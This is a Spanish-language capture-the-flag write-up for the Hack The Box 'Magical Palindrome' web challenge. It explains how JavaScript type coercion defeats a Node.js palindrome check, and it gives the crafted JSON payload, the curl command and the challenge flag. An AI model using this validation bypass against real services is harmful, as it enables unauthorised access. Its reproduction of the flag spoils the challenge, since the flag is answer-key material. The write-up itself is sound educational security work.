
### Hack The Box: Magical Palindrome (Web Challenge) Writeup

**Descripción:**
"Magical Palindrome" es un reto web que se centra en el abuso de las peculiaridades de JavaScript en el servidor (Node.js/Hono), específicamente aprovechando la coerción de tipos (Type Coercion) y la falta de validación estricta de variables en el procesamiento de JSON.

#### 1. Análisis del Código Fuente
El reto proporciona el código fuente de la aplicación (`index.mjs`). Al analizar el endpoint que recibe las peticiones POST, encontramos la siguiente lógica de validación para determinar si una entrada es un palíndromo:

```javascript
const IsPalinDrome = (string) => {
    if (string.length < 1000) {
        return 'Tootus Shortus';
    }

    for (const i of Array(string.length).keys()) {
        const original = string[i];
        const reverse = string[string.length - i - 1];

        if (original !== reverse || typeof original !== 'string') {
            return 'Notter Palindromer!!';
        }
    }
    return null;
}
```

**Vulnerabilidades identificadas:**
1.  **Falta de validación de tipo inicial:** La función espera un `string`, pero no verifica si el input (`palindrome`) es realmente una cadena de texto antes de operar sobre él.
2.  **Type Coercion en la condición:** La validación `string.length < 1000` puede ser engañada si le pasamos un objeto con una propiedad `"length"` cuyo valor sea una cadena como `"1000"`, ya que en JavaScript `"1000" < 1000` se evalúa como `false`.
3.  **Abuso del constructor `Array()`:** Si `string.length` es una cadena de texto (ej. `"1000"`), `Array("1000")` creará un arreglo de **un solo elemento** `["1000"]`, en lugar de un arreglo de 1000 posiciones vacías. Esto provoca que el bucle `for...of` solo se ejecute **una vez** (`i = 0`).

#### 2. Construcción del Payload
Sabiendo que el iterador solo correrá para el índice `0`, necesitamos construir un objeto JSON que satisfaga la única iteración del ciclo:
*   Debe tener la propiedad `"length": "1000"`.
*   Para la primera iteración (`i = 0`), buscará `string[0]`, así que definimos `"0": "a"`.
*   Para la comparación inversa (`string.length - i - 1`), JavaScript convertirá el string `"1000"` a número de forma implícita. Así, `"1000" - 0 - 1 = 999`. Por lo tanto, definimos `"999": "a"`.

**Payload JSON:**
```json
{
  "palindrome": {
    "length": "1000",
    "0": "a",
    "999": "a"
  }
}
```

#### 3. Explotación
Enviamos el payload diseñado mediante una solicitud POST usando `curl`:

```bash
curl -X POST http://154.57.164.76:31047 \
-H "Content-Type: application/json" \
-d '{"palindrome": {"length": "1000", "0": "a", "999": "a"}}'
```

**Respuesta del servidor:**
`Hii Harry!!! HTB{Lum0s_M@x!ma}`

El servidor acepta nuestro objeto modificado como un palíndromo válido debido al comportamiento impredecible del tipado dinámico, otorgando la flag del reto.

